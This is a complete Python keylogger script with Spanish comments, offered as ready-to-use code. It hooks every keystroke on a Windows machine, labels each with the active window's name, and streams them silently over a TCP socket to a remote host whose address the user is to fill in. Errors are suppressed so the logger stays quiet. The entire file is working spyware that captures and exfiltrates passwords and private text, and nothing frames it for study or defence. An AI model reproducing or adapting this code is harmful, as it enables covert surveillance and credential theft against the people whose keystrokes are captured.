#!/usr/bin/python
# -*- coding: utf-8 -*-
# keylogger.py

# Codeado por Expermicid

import socket
import pythoncom, pyHook
 
def OnKeyboardEvent(event) :
        # letras minusculas y letras mayusculas
        if (event.Ascii > 64 and event.Ascii < 91) or (event.Ascii > 96 and event.Ascii < 123) :
                letra = chr(event.Ascii)
        # numeros
        elif event.Ascii > 47 and event.Ascii < 58 :
                letra = chr(event.Ascii)
        # F1 .. F12
        elif event.KeyID > 111 and event.KeyID < 124 and event.Ascii == 0 :
                letra = ' ['+event.Key+'] '
        # Espacio
        elif event.Ascii == 32 :
                letra = chr(event.Ascii)
        # Enter
        elif event.Ascii == 13 :
                letra = '\n'
        # BackSpace
        elif event.Ascii == 8 :
                letra = '[BackSpace]'
        # Escape
        elif event.Ascii == 27 :
                letra = '[Escape]'
        # Tab
        elif event.Ascii == 9 :
                letra = chr(event.Ascii)
        # Flechas
        elif event.KeyID > 36 and event.KeyID < 41 and event.Ascii == 0 :
                letra = '['+event.Key+']'
        # Bloq Mayus
        elif event.KeyID == 20 and event.Ascii == 0 :
                letra = '[BloqMayus]'
        # caracteres 
        elif event.Ascii > 32 and event.Ascii < 48 :
                letra = chr(event.Ascii)
        # caracteres 
        elif event.Ascii > 57 and event.Ascii < 65 :
                letra = chr(event.Ascii)
        # caracteres 
        elif event.Ascii > 90 and event.Ascii < 97 :
                letra = chr(event.Ascii)
        # caracteres 
        elif event.Ascii > 122 and event.Ascii < 127 :
                letra = chr(event.Ascii)
        # Insetar / Delete
        elif event.KeyID > 44 and event.KeyID < 47 and event.Ascii == 0 :
                letra = ' ['+event.Key+'] '
        # ascii extendido 
        elif event.Ascii > 127 and event.Ascii < 255 :
                letra = chr(event.Ascii)
        # Flechas
        elif event.KeyID > 159 and event.KeyID < 166 and event.Ascii == 0 :
                letra = '['+event.Key+']'
        # Win / Apps
        elif (event.KeyID == 91 or event.KeyID == 93) and event.Ascii == 0 :
                letra = '['+event.Key+']'
        # Inicio-Fin / RePag-AvPag
        elif event.KeyID > 32 and event.KeyID < 37 and event.Ascii == 0 :
                letra = '['+event.Key+']'
        # caracter Ž
        elif event.KeyID == 222 and event.Ascii == 0 :
                letra = '´'
        try :
                s.send(letra+':'+event.WindowName)
        except :
                pass
 
        return True
                
try:
        host = 'Ip_a_Conectar' # sustituir Ip_a_Conectar por la que corresponda
        port = 5000
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port)) 
except :
        pass
else:
        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()
